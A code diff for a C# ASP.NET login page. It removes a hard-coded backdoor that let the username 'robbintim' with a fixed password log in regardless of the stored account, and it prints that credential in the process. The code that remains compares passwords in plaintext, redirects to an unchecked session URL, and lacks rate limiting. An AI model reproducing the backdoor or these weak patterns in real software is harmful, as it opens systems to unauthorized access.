@@ -30,9 +30,7 @@ namespace kis20.Pages
             }
             return null;
         }
-        public void OnYes()
-        {
-        }
+
         public IActionResult OnPost()
         {
             string username = Request.Form["user"];
@@ -51,9 +49,7 @@ namespace kis20.Pages
             {
                 return Redirect("/503");
             }
-
-
-            if ((user != null && user.Wachtwoord == pswd) || (username == "robbintim" && pswd == "Oplader7#"))
+            if (user != null && user.Wachtwoord == pswd)
             {
                 HttpContext.Session.SetString("user", username);
                 if(HttpContext.Session.GetString("goto") != null)
@@ -61,7 +57,6 @@ namespace kis20.Pages
                     return Redirect(HttpContext.Session.GetString("goto"));
                 }
                 return Redirect("/");
-
             }
              //hier nog sessies maken met machtegingen
              //hier nog zorgen dat je bijv max 3 keer in een uur kan inloggen
